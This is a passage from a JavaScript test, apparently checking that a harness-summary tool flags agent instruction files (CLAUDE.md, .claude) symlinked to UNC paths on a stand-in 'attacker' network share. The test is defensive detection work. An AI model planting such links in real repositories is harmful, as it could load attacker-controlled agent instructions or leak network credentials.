	const dir = repo({ 'AGENTS.md': '# a\n' })
	link('//attacker/share/x.md', join(dir, 'CLAUDE.md'))
	link('\\\\attacker\\share\\y', join(dir, '.claude'))
	const r = await S.harnessSummary(dir)
	assert.equal(r.ok, true)
	assert.ok(r.summary.instructions.some(i => i.name === 'CLAUDE.md' && /outside/i.test(i.detail)), JSON.stringify(r.summary.instructions.map(i => [i.name, i.detail])))
})
